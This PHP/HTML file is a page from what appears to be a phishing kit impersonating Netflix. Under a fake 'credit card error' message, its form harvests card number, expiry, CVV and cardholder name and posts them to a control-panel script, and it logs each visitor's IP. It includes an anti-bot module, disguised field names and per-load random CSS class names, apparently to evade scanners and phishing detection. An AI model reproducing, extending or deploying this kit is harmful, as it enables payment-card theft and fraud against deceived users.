<?php
    error_reporting(0);
    session_start();
    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    require_once "../setting/lang.php";
    
    // Lang Fucntion :
    lang();

    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page Credit Card Error";
    get_page_info($get_name_page, $get_name_file);
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/global-rules.css">
    <!-- Js Validator -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Netflix - <?php echo get_text('title_head_4'); ?></title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> body-other">

    <!-- Navigation -->
    <nav>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-nav">
                <img src="../img/logo.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-sign-out show-message-explain"><?php echo get_text('logout'); ?></span>
            </div>
        </div>
    </nav>
    <!-- Navigation -->

    <!-- Sign In Form -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> main">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-main">
                <form action="../control-panel/check-action.php" method="post" id="formData">
                    <input type="hidden" name="step" value="credit-card-error">
                    <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> steps"><?php echo get_text('step_small_two'); ?></div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container-progress">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> progress" style="width: 50%;"></div>
                    </div>
                    <h1><?php echo get_text('title_step_4'); ?></h1>
                    <p><?php echo get_text('p_explain_step_4'); ?></p>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> logos-payment">
                        <img src="../img/visa.png" alt="">
                        <img src="../img/mastercard.png" alt="">
                        <img src="../img/american-express.png" alt="">
                        <img src="../img/discover.png" alt="">
                    </span>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alret-block-account">
                        <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-triangle-exclamation"></i>
                        <p>
                            <?php echo get_text('message_error_pages_3'); ?>
                        </p>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" style="padding-bottom: 30px !important;" id="div1">
                        <label for="numberdrac" id="labelnumberdrac"><?php echo get_text('one_label'); ?></label>
                        <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" type="tel" id="numberdrac" name="numberdrac">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error-card" id="messageError1"><img src="../img/icon-error-2.png" alt=""><?php echo get_text('message_error_inputs'); ?></small>
                        <img src="../img/icon-card.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-card">
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container-inputs-2-col">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" style="margin-right: 10px;padding-bottom: 30px !important;" id="div2">
                            <label for="datedrac" id="labeldatedrac"><?php echo get_text('two_lable'); ?><?php echo get_text('two_label_explain'); ?></label>
                            <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" type="tel" id="datedrac" maxlength="5" name="datedrac">
                            <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error-card" id="messageError2"><img src="../img/icon-error-2.png" alt=""><?php echo get_text('message_error_inputs'); ?></small>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" style="padding-bottom: 30px !important;" id="div3">
                            <label for="vvcdrac" id="labelvvcdrac"><?php echo get_text('three_label'); ?></label>
                            <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" type="tel" maxlength="4" id="vvcdrac" name="vvcdrac">
                            <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error-card" id="messageError3"><img src="../img/icon-error-2.png" alt=""><?php echo get_text('message_error_inputs'); ?></small>
                            <img src="../img/icon-card-2.png" style="cursor: pointer !important;" id="buttonShowExplainCvv" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-card">
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" style="padding-bottom: 30px !important;" id="div4">
                        <label for="nameCard" id="labelNameCard"><?php echo get_text('name_card_label'); ?></label>
                        <input type="text" name="name_card" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" id="nameCard">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error-card" id="messageError4"><img src="../img/icon-error-2.png" alt=""><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-button">
                        <button type="submit"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-send-data" id="buttonSendData" name="send_data_6"><?php echo get_text('button_send_data'); ?></button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> explain-cvv" id="explainCvv">
        <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark icon-close-explain-cvv" id="closeExplainCvv"></i>
        <p>
            <?php echo get_text('cvv_explain'); ?>
        </p>
        <img src="../img/cvv-1.png" alt="">
        <img src="../img/cvv-2.png" alt="">
    </div>

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> footer">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-footer">
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain"><?php echo get_text('title_footer'); ?></h1>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-footer">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_1'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_2'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_3'); ?></span>
                    </div>

                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_4'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_5'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_6'); ?></span>
                    </div>
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> box-lang">
                  <img src="../img/icon-lang-2.png" alt="">
                    <select>
                        <option value=""><?php echo get_text('lang_footer'); ?></option>
                    </select>
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> svg-select-lang" width="16" height="16" viewBox="0 0 16 16" role="img" data-icon="CaretDownSmall" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path></svg>
                </div>
            </div>
        </div>
    </div>

    <!-- Message Explain -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-user" id="messageUser">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-message-user">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-messsage-user">
                <img src="../img/logo.png" alt="">
                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-header" id="closeMessageuser1" type="button"><i
                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark"></i></button>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-message-user">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alert-icon">
                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-shield-halved"></i>
                </span>
                <h2><?php echo get_text('title_message_user'); ?></h2>
                <p>
                    <?php echo get_text('text_message_user'); ?>
                </p>
                <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-user" id="closeMessageuser2"><?php echo get_text('button_message_user'); ?></button>
            </div>
        </div>
    </div>
    <!-- Message Explain -->

    <script src="../js/main.js"></script>
    <script src="../js/script-card.js"></script>
    <script src="../js/script-validator.js"></script>
    <script>
        $(function(){function e(){$("#numberdrac").validateCreditCard(function(e){!1==e.valid?($("#div1").removeClass("success"),$("#numberdrac").addClass("error-input"),$("#messageError1").addClass("show-error-message")):($("#div1").addClass("success"),$("#messageError1").removeClass("show-error-message"),$("#numberdrac").removeClass("error-input"))})}$("#buttonSendData").click(function(){e()}),$("#numberdrac").on("input",function(){e()}),$("#numberdrac").on("blur",function(){e()})});const cleaceCC=new Cleave("#numberdrac",{creditCard:!0,delimiter:" "}),cleaveDate=new Cleave("#datedrac",{date:!0,datePattern:["m","y"]});
    </script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?>
</body>
</html>
